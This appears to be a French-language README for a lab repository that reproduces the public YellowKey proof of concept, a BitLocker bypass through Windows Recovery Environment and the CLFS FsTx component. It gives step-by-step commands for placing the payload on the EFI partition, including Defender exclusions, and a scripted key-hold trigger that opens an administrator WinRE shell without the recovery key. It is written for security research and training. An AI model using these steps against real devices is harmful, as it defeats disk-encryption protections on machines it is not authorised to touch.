# ludus-yellowkey-lab

Lab [Ludus](https://docs.ludus.cloud) auto-deploye pour reproduire le PoC
[Nightmare-Eclipse/YellowKey](https://github.com/Nightmare-Eclipse/YellowKey) :
un bypass BitLocker via le composant CLFS (`FsTx`) charge par le Windows
Recovery Environment au boot.

> **Scope** : recherche securite / red team / formation. Ne deploie ce lab
> que sur une infra que tu controles.

## Resultat attendu

A la fin de la procedure, tu obtiens un shell
`Administrator: X:\windows\system32\cmd.exe` en WinRE **sans avoir saisi la
recovery password BitLocker**, alors que cliquer "Command Prompt" sur un
systeme protege normalement la demande systematiquement.

Screenshots du PoC reussi : [`poc-screenshots/`](poc-screenshots/).

## Architecture du lab

Une seule VM Win11 22H2 standalone, chiffree BitLocker (TPM-only), avec
un disque scsi1 supplementaire monte pour servir de "cle USB" virtuelle :

| Item | Detail |
|---|---|
| Range Ludus | `yellowkey` (cree via `ludus range create -r yellowkey`) |
| VM | `yellowkey-yk-win11` -- VLAN 20, `.11` |
| Template Ludus utilise | `win11-22h2-x64-enterprise-template` (UEFI, vTPM-compatible) |
| Hardware add-on (post-deploy via `qm`) | vTPM 2.0 + disque scsi1 2 Go |
| BitLocker | TPM protector + RecoveryPassword, XTS-AES 128, Used Space Only Encrypted |

### Pourquoi Win Server 2022 n'est pas inclus

Le template Ludus `win2022-server-x64-template` est compile en BIOS legacy
(pas d'EFI), donc BitLocker en mode TPM-only sur le volume OS n'est pas
utilisable. Et meme en BIOS, ce template ne sysprep pas correctement l'OOBE
post-clone -- la VM reste bloquee sur "Choose your keyboard layout".
YellowKey est documente comme aussi vulnerable sur Server 2022/2025, mais ce
lab se concentre sur Win11.

## Pre-requis

- Serveur Ludus 2.x fonctionnel avec template `win11-22h2-x64-enterprise-template`
  deja build (`ludus templates list` doit le montrer en `BUILT`)
- Client `ludus` v2.x cote local, avec une API key configuree (`ludus apikey`)
- Acces root SSH au noeud Proxmox sous-jacent
  (necessaire pour ajouter vTPM + disque secondaire, options absentes du schema range-config Ludus)
- `sshpass` (`brew install sshpass`) pour scripter les commandes Proxmox

Variables d'environnement utilisees par les scripts :

```bash
export PVE_HOST=10.0.0.10           # IP de ton noeud Proxmox
export PVE_PASS='your-pve-password' # mot de passe root@pam
```

## Procedure complete

### 1. Installer le role Ansible custom dans Ludus

```bash
git clone https://github.com/n1kn0w/ludus-yellowkey-lab.git
cd ludus-yellowkey-lab
ludus ansible role add -d ansible/roles/sbr.bitlocker
```

### 2. Creer le range et pousser la config

```bash
ludus range create -r yellowkey \
  --name "YellowKey BitLocker PoC" \
  --description "PoC du bypass YellowKey via WinRE/FsTx" \
  --purpose "Security research"

ludus range config set -f range-config.yml -r yellowkey
ludus range deploy -r yellowkey
```

Premier deploy long (10-15 min pour le sysprep Win11).

> **Si le deploy echoue en "WinRM UNREACHABLE"** : sysprep laisse parfois
> la VM en profil reseau Public, le firewall bloque WinRM. Force le profil
> Private + ouvre la regle :
>
> ```bash
> sshpass -p "$PVE_PASS" ssh root@$PVE_HOST \
>   'qm guest exec <vmid> --timeout 60 -- powershell.exe -NoProfile -Command \
>    "Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private; \
>     Enable-NetFirewallRule -DisplayGroup \"Windows Remote Management\""'
> ludus range deploy -r yellowkey
> ```

### 3. Ajouter vTPM + disque "USB" sur la VM

```bash
PVE_HOST="$PVE_HOST" PVE_PASS="$PVE_PASS" ./scripts/post-deploy-hw.sh yellowkey
```

Ce que fait le script :

1. Shutdown propre de la VM
2. `qm set <vmid> -tpmstate0 local:1,size=4M,version=v2.0`
3. `qm set <vmid> -scsi1 local:2,ssd=1,discard=on`
4. Power on

### 4. Activer BitLocker via le role Ansible

```bash
ludus range deploy -r yellowkey --tags user-defined-roles
```

Le role `sbr.bitlocker` :

1. Detecte le TPM via `Get-Tpm`
2. Initialise le TPM si besoin
3. `Enable-BitLocker -TpmProtector -UsedSpaceOnly`
4. Ajoute un `RecoveryPasswordProtector`
5. Sauve la recovery password localement sur le Ludus host
6. Reboot pour passer `ProtectionStatus = On`

Verification depuis la VM :

```powershell
manage-bde -status C:
# Conversion Status:    Used Space Only Encrypted
# Encryption Method:    XTS-AES 128
# Protection Status:    Protection On
```

### 5. Recuperer la recovery key (pour pouvoir desactiver BitLocker plus tard)

Le service `ludus.service` tourne avec `PrivateTmp=true`, le fichier
est dans un sous-rep systemd :

```bash
mkdir -p recovery-keys
sshpass -p "$PVE_PASS" scp -q \
  "root@$PVE_HOST:/tmp/systemd-private-*-ludus.service-*/tmp/yk-recovery-*.txt" \
  ./recovery-keys/
cat recovery-keys/yk-recovery-yellowkey-yk-win11.txt
```

Cote Windows : `manage-bde -protectors -get C:`.

### 6. Deposer le payload FsTx sur la partition EFI

**Important** : un disque NTFS secondaire (`E:`) ne suffit pas -- WinRE ne le
scanne pas. Le payload doit aller dans `System Volume Information\FsTx\` de
la **partition EFI** du disque OS.

```bash
# Le script monte temporairement EFI sur Y:, clone YellowKey, copie FsTx,
# gere les exclusions Defender (Microsoft a la signature Exploit:Win32/YellowKey.BB
# depuis fin 2025) et restaure les .blf depuis la quarantaine si besoin.
sshpass -p "$PVE_PASS" ssh root@$PVE_HOST \
  'bash -s' < scripts/deploy-payload.sh yellowkey
```

(Le script `deploy-payload.sh` est un wrapper qui execute le PowerShell
correspondant via `qm guest exec`. Voir le fichier pour les details.)

### 7. Trigger l'exploit

Sequence :

1. `reagentc /boottore` (planifie le boot suivant en WinRE)
2. `shutdown /r /t 0` (reboot)
3. Naviguer en WinRE : Keyboard Layout (Enter) -> Choose an option
   (Enter -> Troubleshoot/Advanced) -> arrow Down (focus Command Prompt)
4. **Maintenir CTRL_L enfonce** (via QMP `input-send-event {down: true}`,
   *pas* de release)
5. Enter sur "Command Prompt"

Tout est automatise dans `scripts/yk-trigger-final.sh` :

```bash
sshpass -p "$PVE_PASS" scp -q scripts/yk-trigger-final.sh root@$PVE_HOST:/tmp/
sshpass -p "$PVE_PASS" ssh root@$PVE_HOST 'chmod +x /tmp/yk-trigger-final.sh && /tmp/yk-trigger-final.sh'
```

Screenshots dans `/tmp/yk-clean/` cote Proxmox. Recupere-les :

```bash
sshpass -p "$PVE_PASS" scp -q "root@$PVE_HOST:/tmp/yk-clean/*.png" ./
```

Si tout fonctionne, le screenshot `05_after_1.png` montre une fenetre
`Administrator: X:\windows\system32\cmd.exe` directement, **sans le prompt
recovery key BitLocker** -- exactement ce que `shell.png` du repo upstream
illustre.

## Limites observees

Le shell obtenu fonctionne mais voit **zero disque fixe** :

- `diskpart` : `list disk` -> *"There are no fixed disks to show."*
- `mountvol` : seulement X:\ (WinRE ramdisk) et D:\ (CD-ROM)
- `wmic diskdrive list brief` : *"No Instance(s) Available."*
- `manage-bde -status` : *"There are no disk volumes that can be protected
  with BitLocker."*

Le `shell.png` du repo originel s'arrete egalement au prompt -- l'auteur ne
demontre pas l'acces R/W au C:. La vuln telle que decrite = obtenir un shell
admin WinRE sans saisir la recovery key. Convertir ce shell en lecture du
volume chiffre necessite probablement des etapes additionnelles non
publiees (chargement manuel de drivers, manipulation FVE...).

## Detail technique : envoyer un `:` via QMP

`shift+semicolon` envoye en chord QMP `send-key` ou en `input-send-event`
multi-events **ne produit pas** `:` sur cette VM Win11 -- le shift est
ignore par le clavier scanner du WinRE. Le contournement : utiliser le
trick **Alt+0058** (numpad ASCII) :

```bash
# Alt down
qmp '{"execute":"input-send-event","arguments":{"events":[
       {"type":"key","data":{"down":true,"key":{"type":"qcode","data":"alt"}}}]}}'

# kp_0 kp_0 kp_5 kp_8 (tapes courts)
for k in kp_0 kp_0 kp_5 kp_8; do ...; done

# Alt up -> commit ASCII 58 = ":"
qmp '{"execute":"input-send-event","arguments":{"events":[
       {"type":"key","data":{"down":false,"key":{"type":"qcode","data":"alt"}}}]}}'
```

C'est ce que fait `yk-shell-diag.sh` pour pouvoir taper `c:` dans le cmd
WinRE.

## Structure du repo

```
.
├── README.md
├── LICENSE
├── range-config.yml                       # Config Ludus
├── ansible/roles/sbr.bitlocker/           # Role qui active BitLocker TPM
│   ├── defaults/main.yml
│   ├── meta/main.yml
│   ├── tasks/main.yml
│   └── README.md
├── scripts/
│   ├── post-deploy-hw.sh                  # qm set vTPM + scsi1
│   ├── yk-trigger-final.sh                # reagentc + nav menu + CTRL hold
│   ├── yk-shell-diag.sh                   # diag dans le cmd WinRE (diskpart, mountvol...)
│   └── trigger-yellowkey.sh               # version legacy (CTRL en taps)
└── poc-screenshots/                       # captures du PoC reussi
```

## Cleanup

```bash
ludus range rm -r yellowkey            # destroy les VMs
ludus range rm-range -r yellowkey      # supprime le range completement
```

## Credits

- Vulnerabilite et payload FsTx : [Nightmare-Eclipse/YellowKey](https://github.com/Nightmare-Eclipse/YellowKey)
- Plateforme : [Ludus](https://docs.ludus.cloud) par bagelByt3s

## Notes de securite operationnelle

- Recovery passwords stockees en clair dans `recovery-keys/` (gitignore en
  place) -- supprime-les apres usage.
- Le payload FsTx provient d'un repo public. Microsoft Defender signe
  ce payload comme `Exploit:Win32/YellowKey.BB` depuis fin 2025. Ne l'execute
  pas hors d'un environnement isole et explicitement autorise.
- Le VLAN 20 du range Ludus `yellowkey` (10.X.20.0/24) est isole de tes
  autres ranges par defaut, mais verifie ta politique inter-VLAN si tu as
  d'autres VMs sensibles cote Ludus.
